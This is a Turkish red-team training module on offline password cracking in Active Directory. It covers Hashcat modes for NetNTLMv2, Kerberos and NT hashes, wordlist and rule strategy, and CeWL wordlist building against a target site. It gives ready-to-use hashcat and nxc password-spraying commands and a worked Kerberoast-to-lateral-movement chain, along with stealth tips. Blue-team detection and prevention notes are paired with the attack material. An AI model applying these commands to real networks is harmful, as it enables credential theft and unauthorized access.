## 1. Kavramsal Temel — Neden Var?

Roasting ve LSASS dökümü sana **hash** verir, ama hash her zaman yeterli değildir:
- **NetNTLMv2 / Kerberos TGS / AS-REP** hash'leri pass-the-hash için kullanılamaz → **kırmak** gerekir.
- Kırılan **düz parola** ise altındır: parola tekrar kullanımı (password reuse) sayesinde bir hesabın parolası başka sistemlerde (VPN, e-posta, bulut) de çalışır — hash'in gitmediği yerlere gider.

> **Offline kırma, savunmanın "göremediği" alandır. DC ile hiç konuşmadan, kilitlenme olmadan, saatlerce/günlerce GPU ile milyarlarca deneme yaparsın. Strateji = doğru moddu, doğru kelime listesini ve doğru kuralları seçmek; kaba kuvvet değil, "insan parola alışkanlıklarını" hedeflemektir.**

**Analoji:** Eve götürdüğün kilitli kasa ([03.1](./03.1_Kerberoasting_ve_AS_REP_Roasting.md) analojisi). Artık zamanın sınırsız. Ama her kombinasyonu denemek (brute) çok uzun — bunun yerine sahibinin doğum tarihi, evcil hayvanı, şirket adı gibi olası kombinasyonları (wordlist + rules) denersin.

## 2. Teknik Derinlik — Mod, Hız ve Strateji

### 2.1 Hangi hash → hangi Hashcat modu

| Kaynak | Hash türü | Hashcat -m | PtH mümkün mü? | Kırma hızı (GPU) |
|--------|-----------|-----------|----------------|------------------|
| Responder ([02.1](../Modul_02_Ilk_Erisim_ve_Yerlesme/02.1_LLMNR_NBTNS_mDNS_Poisoning.md)) | NetNTLMv2 | **5600** | Hayır → kır | Orta |
| Kerberoast ([03.1](./03.1_Kerberoasting_ve_AS_REP_Roasting.md)) | Kerberos 5 TGS (RC4) | **13100** | Hayır → kır | Orta |
| Kerberoast AES | TGS (AES256) | **19700** | Hayır → kır | Yavaş |
| AS-REP ([03.1](./03.1_Kerberoasting_ve_AS_REP_Roasting.md)) | Kerberos 5 AS-REP | **18200** | Hayır → kır | Orta |
| LSASS/NTDS ([03.2](./03.2_LSASS_Bellek_Dokumu.md)) | NTLM (NT hash) | **1000** | **Evet → kırma gerekmez!** | Çok hızlı |
| Cached domain (DCC2) | MSCACHEv2 | **2100** | Hayır → kır | **Çok yavaş** (kasıtlı) |

> **Kritik strateji:** NT hash (m 1000) elde ettiysen **kırmaya gerek yok** — doğrudan pass-the-hash ([Modül 04](../Modul_04_Yanal_Hareket/)). Sadece PtH yapılamayan (challenge-response veya bilet) hash'leri kır. Zamanı boşa harcama.

### 2.2 Saldırı modları ve verimlilik hiyerarşisi

```
   En verimli → en pahalı sıralama:
   1) Wordlist (rockyou.txt)                    → bilinen parolalar
   2) Wordlist + Rules (best64, OneRuleToRuleThemAll) → Password1 → P@ssw0rd1!
   3) Combinator / Hybrid (kelime + maske)       → Corp + 2024!
   4) Mask attack (?u?l?l?l?d?d?d?d?s)           → yapı bilindiğinde
   5) Pure brute-force                           → son çare (çoğu zaman kaybedilmiş)
```

### 2.3 Neden bazı hash'ler kasıtlı yavaş?

MSCACHEv2 (DCC2) ve AES-Kerberos **PBKDF2** ile binlerce iterasyon kullanır → her deneme pahalıdır. Bu, savunmanın "iş faktörü" (work factor) ile kırmayı yavaşlatma tasarımıdır. NT hash (tek MD4) ise çok hızlıdır — bu yüzden NT hash sızması AES bilet sızmasından çok daha tehlikelidir.

```
   Algoritma maliyeti (kaba büyüklük, tek GPU):
   NTLM (MD4)      ~100+ GH/s   → milyarlarca deneme/sn (çok hızlı)
   NetNTLMv2       ~1-3 GH/s
   Kerberos RC4    ~1 GH/s
   Kerberos AES256 ~400 kH/s    → RC4'ten ~2500× yavaş
   DCC2 (MSCACHEv2) ~100 kH/s   → kasıtlı yavaş (PBKDF2)
```

### 2.4 Kırma mı, geçme mi? — karar ağacı

```
   Elde hangi materyal var?
   ├─ NT hash (m 1000)        → ÖNCE Pass-the-Hash dene (Modül 04). Kırma sadece
   │                            parola tekrar-kullanımı (VPN/bulut) için gerekli.
   ├─ Kerberos bilet (.kirbi) → Pass-the-Ticket (Modül 04). Kırma GEREKMEZ.
   ├─ AES key (sekurlsa::ekeys) → Overpass-the-Hash (Modül 04). Kırma GEREKMEZ.
   ├─ NetNTLMv2 / TGS / AS-REP → PtH YOK → KIRMAK ZORUNDA
   └─ DCC2                     → PtH YOK, çok yavaş → sadece küçük/hedefli wordlist
```

> **En sık hata:** NT hash'i "kırmaya" çalışıp saatler harcamak — oysa NT hash zaten PtH için yeterlidir. Kırma yalnızca "parolanın kendisi başka yerde lazım" olduğunda mantıklıdır.

## 3. Pratik Uygulama

### 3.1 Temel kırma komutları

```bash
# NetNTLMv2
hashcat -m 5600 net.txt rockyou.txt -r rules/best64.rule -O

# Kerberoast RC4 / AES
hashcat -m 13100 kerb.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule
hashcat -m 19700 kerb_aes.txt rockyou.txt

# AS-REP
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule

# NT hash (kırmak yerine önce PtH dene! ama parola tekrar kullanımı için kır)
hashcat -m 1000 nt_hashes.txt rockyou.txt -r rules/best64.rule

# Cached domain creds (yavaş — hedefli, küçük wordlist)
hashcat -m 2100 dcc2.txt top10k.txt
```

### 3.2 Akıllı wordlist üretimi

```bash
# CeWL — hedef şirketin web sitesinden özel kelime listesi (şirket-özel parolalar)
cewl -d 3 -m 6 https://www.hedefsirket.com -w corp_words.txt

# Kırılmış parolalardan yeni kural türet (bir sonraki hedefe uyarla)
hashcat --show cracked.txt
# Maske: şirket parola politikası biliniyorsa (8+ karakter, büyük+küçük+rakam)
hashcat -m 1000 nt.txt -a 3 '?u?l?l?l?l?d?d?d!'
```

### 3.3 Kırılan parolayı doğrula ve tekrar-kullanımı test et

```bash
# Kırılan parola başka sistemlerde çalışıyor mu? (password reuse spray)
nxc smb 10.10.10.0/24 -u users.txt -p 'CrackedPass!' --continue-on-success
# Kırılan svc hesabı yerel admin nerede?
nxc smb 10.10.10.0/24 -u svc-sql -p 'Sql2019!'
```

### 3.4 İleri strateji — kurallar, maskeler, dağıtık kırma

```bash
# Kırılan parolalardan istatistik çıkar → hedef-özel kural üret (PACK/rulegen)
hashcat --show all_cracked.txt | cut -d: -f2 > cracked_pw.txt
# Prince / kombinatör (şirket kelimeleri + yıl + özel karakter)
princeprocessor corp_words.txt | hashcat -m 1000 nt.txt -r rules/best64.rule

# Maske (politika biliniyorsa: 1 büyük + 5 harf + 2 rakam + 1 sembol)
hashcat -m 13100 kerb.txt -a 3 '?u?l?l?l?l?l?d?d?s' --increment

# Dağıtık/hız: birden çok GPU node → hashtopolis; veya potfile paylaş
hashcat -m 1000 nt.txt rockyou.txt --remove --potfile-path team.potfile
```

### 3.5 Gerçek-dünya kırma zinciri

```
   1) 03.1 Kerberoast → svc-sql TGS (RC4, m13100)
   2) hashcat -m 13100 -r OneRuleToRuleThemAll → 'Sql2019!' (14 dk)
   3) svc-sql parolasını sprayle: nxc smb /24 -u svc-sql -p 'Sql2019!'
      → SRV05, SRV12'de "Pwn3d!" (yerel admin) — parola tekrar-kullanımı!
   4) SRV05 → LSASS → yeni kimlikler → grafiği genişlet (01.2)
   Not: NT hash de düşseydi kırmaya gerek kalmadan doğrudan PtH (Modül 04) yapardık.
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| Offline kırma | **T1110.002** (Password Cracking) | **Hiçbiri** — DC dışında, tamamen offline | Önleme: uzun/rastgele parola, LAPS, gMSA |
| Kırılan parola ile yeniden kullanım | T1078 (Valid Accounts) | Başarılı 4624 (yeni kaynak) → yanal hareket | [Blue 04.1](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.1_Anormal_Oturum_Acma_Analizi.md) |

**OPSEC notları:**
- **Kırma tamamen görünmezdir** — bu yüzden savunma "tespit" değil **önleme** oynar: LAPS (her makinede benzersiz uzun yerel admin parolası → [Blue 03.2](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.2_LAPS_ile_Yerel_Admin_Parola_Yonetimi.md)), gMSA (120+ karakter servis parolası), FGPP (uzunluk zorlama), AES zorlama (RC4 downgrade'i kes → [Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)). Bu kontroller varsa hash'in kırılamaz.
- **İz kırma değil, kullanımdadır.** Kırdığın parolayı sprayle test ederken ([03.4 §3.3]) 4624/4625 üretirsin — [Blue 04.1](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.1_Anormal_Oturum_Acma_Analizi.md) burada yakalar. Doğruladığın parolayı gereksiz yaymadan, hedefli kullan.
- **Öncelik matrisi:** NT hash varsa → PtH (kırma yok). Bilet varsa → PtT. Yalnızca challenge-response/roast hash'lerini kır. gMSA/LAPS hash'lerine zaman harcama (pratikte kırılamaz).
- **potfile hijyeni:** Ekip halinde çalışırken ortak `--potfile-path` kullan; aynı hash'i iki kez kırma. Kırılan parolaları sonraki hedefe kural olarak besle (bir kurumda parola desenleri tekrarlanır: `Sirket<Yıl>!`).
- **etype seçimi kırma öncesi başlar:** Roast anında ([03.1](./03.1_Kerberoasting_ve_AS_REP_Roasting.md)) RC4 (m13100) elde edebiliyorsan et — AES256 (m19700) ~2500× yavaştır. Ama RC4 talebi AES-zorlamalı ortamda seni ele verir; hız/gizlilik dengesini bilinçli kur.
- Kırma altyapını (GPU) hedeften **tamamen ayrık** tut — operasyonel güvenlik için hash'i dışarı taşı, orada kır.
